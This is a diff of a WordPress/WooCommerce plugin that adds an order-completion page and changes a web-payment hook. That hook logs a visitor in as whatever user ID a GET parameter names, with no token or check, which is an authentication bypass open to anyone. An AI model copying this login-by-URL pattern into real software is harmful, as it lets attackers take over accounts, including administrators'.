@@ -34,6 +34,28 @@ if (!function_exists('skye_activated')) {
                 PRIMARY KEY (ID)
             ) " . $charset_collate . ";";
     dbDelta($sql);
+
+
+    //PAGE FOR ORDER COMPLETION
+    $page_name = "app-complete-order";
+        if ($page = get_page_by_path( $page_name)) {
+            update_post_meta( $page->ID, '_wp_page_template', 'app-complete-order.php');
+            update_metadata( 'page', $page->ID, '_wp_page_template', 'app-complete-order.php.php');
+        } else {
+            $page_args = array(
+                'post_title' => 'Complete Order',
+                'post_name' => $page_name,
+                'post_content' => '',
+                'post_status' => 'publish',
+                'post_author' => 1,
+                'post_type' => 'page'
+            );
+            $page_id = wp_insert_post( $page_args);
+            update_post_meta( $page_id, '_wp_page_template', 'app-complete-order.php');
+            update_metadata( 'page', $page_id, '_wp_page_template', 'app-complete-order.php');
+        }
+
+
     }
 }
 //welcome message
@@ -90,12 +112,15 @@ add_action( 'init', 'skye_update_custom_roles' );
 
 
 // FOR WEB PAYMENT
-add_action( 'wp_loaded', function() {
+add_action( 'init', function() {
+
     if (isset($_GET["sk-user-checkout"]) && isset($_GET['sk-web-payment'])) {
         $user_id = $_GET["sk-user-checkout"];
         if (sk_user_exists($user_id)) {
-            if (!is_user_logged_in( )) {
+            if (!is_user_logged_in() && get_current_user_id() != $user_id) {
                 $user = get_user_by('ID', $user_id);
+                clean_user_cache($user->ID);
+                wp_clear_auth_cookie();
                 wp_set_current_user( $user_id, $user->user_login);
                 wp_set_auth_cookie( $user_id, true);
                 do_action( 'wp_login', $user->user_login, $user);
@@ -107,7 +132,7 @@ add_action( 'wp_loaded', function() {
                 </script>
                 <?php
             }
-        }
+        } 
     }
 });
 
@@ -150,19 +175,27 @@ add_action('wp_head', function() {
     }
  });
 
+ //ORDER COMPLETING PAGE
+ add_filter( 'page_template', function($template) {
+    if(is_page_template('app-complete-order.php') || is_page('app-complete-order'))
+        $template = plugin_dir_path( __FILE__ ) . 'pages/app-complete-order.php';
 
-// add_action('wp_footer', function() {
-    //footer for testing
-    // $delivery_zones = WC_Shipping_Zones::get_zones();
-    // $product = wc_get_product(21);
-    // $shipping_class_id = $product->get_shipping_class_id();
-    
-    // // // return;
-    // foreach($delivery_zones as $zone) {
-    //     foreach($zone['shipping_methods'] as $method) {
-    //         // print_r($method);
-    //         // var_dump($method->instance_settings);   
-    //         echo "<br><br><br>====================================<br>";
-    //     }
-    // }
-// });
+    return $template;
+});
+
+
+
+add_action( 'wp_footer', function() {
+    // global $wc_points_rewards;
+    // $order = new WC_Order(376);
+    // $discount_code = WC_Points_Rewards_Discount::get_discount_code();
+    // $discount_amount = 5;
+    // $points_redeemed = WC_Points_Rewards_Manager::calculate_points_for_discount($discount_amount);
+    // WC_Points_Rewards_Manager::decrease_points($order->get_user_id(), $points_redeemed, 'order-redeem', array('discount_code' => $discount_code, 'discount_amount' => $discount_amount), $order->get_id());
+    // update_post_meta($order->get_id(), '_wc_points_redeemed', $points_redeemed);
+    // // add order note
+    // $order->add_order_note(sprintf(__('%d %s redeemed for a %s discount.', 'wc_points_rewards'), $points_redeemed, $wc_points_rewards->get_points_label($points_redeemed), wc_price($discount_amount)));
+    // $order->calculate_totals();
+    // $order->save();
+    // sk_wc_order_add_discount(376, __("Fixed discount"), 12 );
+});
